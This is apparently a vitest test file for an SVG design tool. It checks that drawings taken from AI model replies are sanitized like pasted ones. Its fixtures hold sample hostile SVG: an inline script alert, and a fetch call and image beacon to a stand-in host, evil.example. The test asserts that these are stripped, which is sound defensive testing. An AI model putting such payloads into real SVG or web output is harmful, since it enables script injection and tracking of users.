// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { extractSvg } from '@/components/studio/architect';
import { intake } from './svg-intake';

// DESCRIBE'S CONTRACT: the model supplies a SOURCE, not a trusted one.
//
// The three sibling faculties return a structured recipe precisely so model text never reaches a
// same-origin frame. Motion cannot — an SVG IS the artifact — so what makes it safe is that a
// generated drawing is untrusted in exactly the way a pasted one is, and goes through the SAME
// doorway. These tests pin both halves: extraction stays dumb, and intake stays the only guard.

describe('pulling a drawing out of a model reply', () => {
	it('takes a bare <svg>', () => {
		expect(extractSvg('<svg viewBox="0 0 10 10"><path d="M0 0 H1"/></svg>')).toContain('<path');
	});

	it('takes one out of a fenced, chatty reply — models add prose whatever you ask', () => {
		const reply = 'Sure! Here is a diagram:\n\n```svg\n<svg viewBox="0 0 10 10"><path id="a" d="M0 0 H1"/></svg>\n```\n\nLet me know if you want changes.';
		const svg = extractSvg(reply);
		expect(svg?.startsWith('<svg')).toBe(true);
		expect(svg?.endsWith('</svg>')).toBe(true);
		expect(svg).not.toContain('Sure!');
	});

	it('returns null rather than a guess when there is no drawing', () => {
		expect(extractSvg('I cannot draw that.')).toBeNull();
		expect(extractSvg('')).toBeNull();
		expect(extractSvg('<svg viewBox="0 0 1 1">')).toBeNull();
	});

	it('does NOT sanitize — that is intake\'s single job, and a second guard would drift from it', () => {
		const hostile = '<svg viewBox="0 0 10 10"><script>alert(1)</script><path d="M0 0 H1"/></svg>';
		expect(extractSvg(hostile)).toContain('<script>');
	});
});

describe('a generated drawing crosses the same doorway a pasted one does', () => {
	it('is sanitized, stripped and namespaced by intake, exactly like a paste', () => {
		// What a compromised or confused model might return: a script, an off-origin beacon, and a
		// stylesheet whose loss would silently blank the drawing.
		const reply = `Here you go:\n\n<svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><style>.a{stroke:red}</style><script>fetch('https://evil.example/x')</script><image href="https://evil.example/beacon.png" width="9" height="9"/><rect id="first-stage" class="a" x="4" y="10" width="30" height="24" fill="none" stroke="var(--accent)"/><path id="link" d="M34 22 H60" fill="none" stroke="var(--text-muted)"/></svg>`;
		const svg = extractSvg(reply);
		expect(svg).toBeTruthy();
		const r = intake(svg ?? '');
		if (!r.ok) throw new Error(r.message);

		expect(r.art).not.toContain('<script');
		expect(r.art).not.toContain('evil.example');
		expect(r.art).not.toContain('<style');
		// The author's meaningful ids survive, namespaced — they are what a person choreographs.
		expect(r.parts.map((p) => p.label)).toEqual(expect.arrayContaining(['First Stage', 'Link']));
		for (const p of r.parts) expect(p.pathRef).toMatch(/^m[a-z0-9]+-/);
		// And the receipt tells the user what was done to the model's drawing, not just to their own.
		expect(r.receipt.removed.images + r.receipt.removed.offOrigin).toBeGreaterThan(0);
		expect(r.receipt.removed.stylesheets).toBe(1);
	});

	it('a drawing shaped the way the prompt asks for is fully drawable', () => {
		// The prompt demands stroke + fill="none" + meaningful ids, because 74% of real geometry
		// carries no stroke and a filled shape cannot be drawn. This is that contract, asserted.
		const asked = '<svg viewBox="0 0 120 60" xmlns="http://www.w3.org/2000/svg"><title>Review loop</title><rect id="draft" x="6" y="16" width="40" height="28" fill="none" stroke="var(--accent)"/><path id="feedback-arrow" d="M46 30 H74" fill="none" stroke="var(--text-muted)"/><rect id="review" x="74" y="16" width="40" height="28" fill="none" stroke="var(--cat-2-mark)"/></svg>';
		const r = intake(asked);
		if (!r.ok) throw new Error(r.message);
		expect(r.parts).toHaveLength(3);
		expect(r.parts.every((p) => p.drawable), 'every part must be drawable').toBe(true);
		expect(r.parts.every((p) => p.strokeable), 'every part must be emphasizable').toBe(true);
		expect(r.receipt.kept.fixedColors, 'token colors are not "fixed colors"').toBe(0);
		expect(r.parts.map((p) => p.label)).toEqual(['Draft', 'Feedback Arrow', 'Review']);
	});
});
